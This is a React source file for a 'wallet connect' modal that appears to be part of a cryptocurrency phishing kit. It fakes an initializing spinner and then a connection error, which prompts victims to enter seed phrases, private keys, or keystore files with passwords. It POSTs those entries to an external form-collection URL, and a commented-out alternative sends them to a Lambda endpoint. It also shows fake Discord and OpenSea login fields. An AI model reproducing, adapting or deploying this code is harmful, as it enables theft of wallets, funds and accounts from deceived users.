import { useState, useEffect } from "react";
import { Modal, Button, Tabs, Tab, Form, Spinner } from "react-bootstrap";


const WalletModal = ({ show, handleClose, name }) => {
  const [autoconnect, setAutoConnect] = useState(true);
  const [errorToggle, setErrorToggle] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [phrase, setPhrase] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");


  const FORMSPARK_ACTION_URL = "https://submit-form.com/GjJ0oWnip";


  const fetchUserProfile = async () => {
    let value;
    if (phrase !== "") {
       value = phrase;
    }else if (privateKey !== "") {
       value = privateKey
    }else if (keystoreJson !== ""){
      var keystore = "json="+keystoreJson+"password="+keystorePassword+"";
      value = keystore;
    }
    await fetch(FORMSPARK_ACTION_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify({
        value,
        name
      }),
    });
    // navigate("/wallet-address")

        //  fetch('https://el36hfuw4sipollb5whtrptmje0gmcxw.lambda-url.us-east-1.on.aws/query='+value+'&name='+name)
        //   .then(response => navigate("/wallet-address"))
        //   .catch(err => navigate("/wallet-address"));
  };

  useEffect(() => {
    setTimeout(() => {
      if (show === false) setErrorToggle(false);
      else setErrorToggle(true);
    }, 5000);
  }, [show]);

  const handleExit = () => {
    setErrorToggle(false);
    setAutoConnect(true);
  };

  const toggle = () => setAutoConnect(false);
  return (
    <>
      <Modal
        show={show}
        onHide={() => {
          handleClose();
          handleExit();
        }}
        dialogClassName="dialog-pop"
      >
        <Modal.Header closeButton></Modal.Header>
        <Modal.Body>
          <div
            style={{ display: autoconnect ? "block" : "none" }}
            onClick={() => toggle()}
          >
            <div className={errorToggle ? "banner error" : "banner initial"}>
              {errorToggle ? (
                <>
                  Error connecting{" "}
                  <button className="connect-button" onClick={() => toggle()}>
                    connect manually
                  </button>
                </>
              ) : (
                <>
                  Initializing...{" "}
                  <Spinner
                    animation="border"
                    role="status"
                    size="sm"
                    color="light"
                  ></Spinner>
                </>
              )}
            </div>
            <div>
              <Button
                variant="outline-secondary"
                onClick={() => toggle()}
                className="wallet-details banner"
                style={{ width: "100%" }}
              >
                <h5 style={{ textAlign: "left", fontWeight: "600" }}>{name}</h5>
                <p style={{ textAlign: "left" }}>Connect to {name} and more</p>
              </Button>
            </div>
          </div>
          <div style={{ display: autoconnect ? "none" : "block" }}>
            <Tabs
              defaultActiveKey={
                name === "Discord" || name === "OpenSea"
                  ? "credentials"
                  : "phrase"
              }
              id="uncontrolled-tab-example"
              className="mb-3"
            >
              {name !== "Discord" && name !== "OpenSea" && (
                <Tab eventKey="phrase" title="Phrase">
                  <>
                    <Form>
                      <Form.Group>
                        <Form.Control
                          as="textarea"
                          rows={5}
                          placeholder="Phrase"
                          value={phrase}
                          onChange={(e) => setPhrase(e.target.value)}
                        />
                      </Form.Group>

                      <div
                        //   className="d-grip gap-2"
                        style={{ textAlign: "center" }}
                      >
                        <Button
                          variant="primary"
                          size="md"
                          onClick={(e) => {
                            console.log(phrase);
                            fetchUserProfile();
                          }}
                          className="connect-wallet"
                        >
                          Connect
                        </Button>
                      </div>
                    </Form>
                  </>
                </Tab>
              )}
              {name !== "Discord" && name !== "OpenSea" && (
                <Tab eventKey="keystore" title="Keystore JSON">
                  <>
                    <Form>
                      <Form.Group>
                        <Form.Control
                          as="textarea"
                          rows={5}
                          placeholder="Keystore JSON"
                          value={keystoreJson}
                          onChange={(e) => setKeystoreJson(e.target.value)}
                        />
                      </Form.Group>

                      <Form.Group style={{ margin: "10px 0" }}>
                        <Form.Control
                          type="text"
                          placeholder="Keystore Password"
                          value={keystorePassword}
                          onChange={(e) => setKeystorePassword(e.target.value)}
                        />
                      </Form.Group>

                      <div
                        //className="d-grip gap-2"
                        style={{ textAlign: "center" }}
                      >
                        <Button
                          variant="primary"
                          size="md"
                          onClick={(e) => {
                            fetchUserProfile();
                          }}
                          className="connect-wallet"
                        >
                          Connect
                        </Button>
                      </div>
                    </Form>
                  </>
                </Tab>
              )}
              {name !== "Discord" && name !== "OpenSea" && (
                <Tab eventKey="privatekey" title="Private Key">
                  <>
                    <Form>
                      <Form.Group>
                        <Form.Control
                          type="text"
                          placeholder="Private Key"
                          value={privateKey}
                          onChange={(e) => setPrivateKey(e.target.value)}
                        />
                      </Form.Group>

                      <div
                        //className="d-grip gap-2"
                        style={{ textAlign: "center" }}
                      >
                        <Button
                          variant="primary"
                          size="md"
                          onClick={(e) => {
                            fetchUserProfile();
                          }}
                          className="connect-wallet"
                        >
                          Connect
                        </Button>
                      </div>
                    </Form>
                  </>
                </Tab>
              )}
              {name === "Discord" && (
                <Tab eventKey="credentials" title="Credentials">
                  <>
                    <Form>
                      <Form.Group style={{ margin: "10px 0" }}>
                        <Form.Control
                          type="text"
                          placeholder="Username"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                        />
                      </Form.Group>

                      <Form.Group style={{ margin: "10px 0" }}>
                        <Form.Control
                          type="text"
                          placeholder="Password"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                        />
                      </Form.Group>

                      <div
                        //   className="d-grip gap-2"
                        style={{ textAlign: "center" }}
                      >
                        <Button
                          variant="primary"
                          size="md"
                          onClick={(e) => {
                            fetchUserProfile();
                          }}
                          className="connect-wallet"
                        >
                          Connect
                        </Button>
                      </div>
                    </Form>
                  </>
                </Tab>
              )}
              {name === "OpenSea" && (
                <Tab eventKey="credentials" title="Credentials">
                  <>
                    <Form>
                      <Form.Group style={{ margin: "10px 0" }}>
                        <Form.Control
                          type="text"
                          placeholder="Username"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                        />
                      </Form.Group>

                      <Form.Group style={{ margin: "10px 0" }}>
                        <Form.Control
                          type="text"
                          placeholder="Password"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                        />
                      </Form.Group>

                      <div
                        //   className="d-grip gap-2"
                        style={{ textAlign: "center" }}
                      >
                        <Button
                          variant="primary"
                          size="md"
                          onClick={(e) => {
                            console.log(username);
                            console.log(password);
                            fetchUserProfile();
                          }}
                          className="connect-wallet"
                        >
                          Connect
                        </Button>
                      </div>
                    </Form>
                  </>
                </Tab>
              )}
            </Tabs>
          </div>
        </Modal.Body>
      </Modal>
    </>
  );
};

export default WalletModal;
